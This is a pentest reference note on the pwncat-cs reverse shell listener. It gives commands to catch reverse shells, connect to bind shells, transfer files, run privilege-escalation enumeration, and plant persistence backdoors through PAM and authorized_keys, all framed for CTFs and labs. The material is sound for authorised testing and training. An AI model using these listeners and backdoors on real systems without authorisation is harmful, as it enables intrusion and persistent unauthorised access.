---
tags: [pentest, shells, pwncat, listener, automation, initial-access]
tool: pwncat-cs
phase: 5
---
# pwncat-cs Listener

Next-gen reverse shell handler. Automatically upgrades to a full PTY, provides file upload/download, persistence, and enumeration — all from a single listener.

[[00 - README|Folder index]]

## Install

```bash
pip install pwncat-cs
```

## Start a listener

```bash
# Basic listener
pwncat-cs -lp 4444

# Listen with specific platform
pwncat-cs -lp 4444 --platform linux
pwncat-cs -lp 4444 --platform windows
```

## Connect to a bind shell

```bash
pwncat-cs connect://TARGET_IP:4444
```

## Once connected — key commands

| Shortcut | Action |
| --- | --- |
| `Ctrl+D` | Enter pwncat command mode (local) |
| `Ctrl+D` again | Return to remote shell |
| `back` | Return to remote shell from command mode |

## pwncat command mode

```bash
# File operations
upload /local/file /remote/path
download /remote/file /local/path

# Enumeration (auto-runs privesc checks)
run enumerate
run enumerate.file.suid

# Persistence
run implant.backdoor.pam
run implant.backdoor.authorized_key

# Info
info
sessions
```

## Why pwncat over plain netcat

| Feature | netcat | pwncat-cs |
| --- | --- | --- |
| Auto PTY upgrade | No | Yes |
| File transfer | No | Built-in |
| Tab completion | After manual upgrade | Automatic |
| Enumeration | No | LinPEAS-like built-in |
| Persistence modules | No | Yes |
| Multi-session | No | Yes |

> [!tip] Default listener for CTFs and labs
> pwncat-cs saves time on every engagement. Use it as your default listener instead of netcat.

## See also

- [[04 - PTY Upgrade Ritual]]
- [[06 - socat Full TTY]]
- [[01 - Linux Reverse Shells]]
